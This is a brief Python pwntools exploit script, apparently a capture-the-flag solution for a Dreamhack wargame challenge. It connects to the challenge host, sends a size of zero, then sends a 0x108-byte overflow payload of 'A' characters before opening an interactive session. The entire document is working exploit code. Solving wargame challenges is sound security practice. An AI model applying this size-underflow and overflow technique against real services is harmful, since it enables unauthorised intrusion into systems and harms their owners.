from pwn import *
context.log_level='debug'

hosts = 'host1.dreamhack.games'
port = 20798

p = remote(hosts,port)

size = '0'
payload = b'A'*0x108

p.recvuntil('Size: ')
p.sendline(size)
p.recvuntil('Data: ')
p.send(payload)

p.interactive()
